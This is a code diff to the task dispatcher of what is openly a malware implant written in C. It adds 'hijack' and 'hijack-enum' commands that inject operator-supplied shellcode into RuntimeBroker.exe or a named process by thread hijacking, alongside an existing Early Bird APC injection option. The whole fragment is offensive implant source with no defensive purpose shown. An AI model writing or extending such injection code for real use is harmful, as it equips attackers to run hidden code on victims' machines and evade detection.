@@ -1216,8 +1216,24 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                                 BOOL bOk = FALSE;
                                 CHAR szMsg[256] = {0};
 
-                                // Args[1] == "earlybird" → spawn+APC into a new process
+                                // Args[1] == "hijack" → thread hijack a suspended process
                                 if (pTasks[i].dwArgCount > 1 &&
+                                    strcmp(pTasks[i].szArgs[1], "hijack") == 0) {
+                                    bOk = ThreadHijackSuspendedInject(pSc, pTasks[i].dwDataLen,
+                                            "RuntimeBroker.exe");
+                                    sprintf(szMsg, bOk
+                                        ? "[+] Thread hijacked into RuntimeBroker.exe"
+                                        : "[-] Thread hijack failed");
+                                } else if (pTasks[i].dwArgCount > 1 &&
+                                    strcmp(pTasks[i].szArgs[1], "hijack-enum") == 0) {
+                                    WCHAR wsTarget[256] = {0};
+                                    MultiByteToWideChar(CP_UTF8, 0, pTasks[i].szArgs[0],
+                                        -1, wsTarget, 256);
+                                    bOk = ThreadHijackRemoteEnum(wsTarget, pSc, pTasks[i].dwDataLen);
+                                    sprintf(szMsg, bOk
+                                        ? "[+] Thread hijacked into %s"
+                                        : "[-] Thread hijack failed (%s)", pTasks[i].szArgs[0]);
+                                } else if (pTasks[i].dwArgCount > 1 &&
                                     strcmp(pTasks[i].szArgs[1], "earlybird") == 0) {
                                     bOk = EarlyBirdApcInject(pSc, pTasks[i].dwDataLen,
                                             pTasks[i].szArgs[0]);
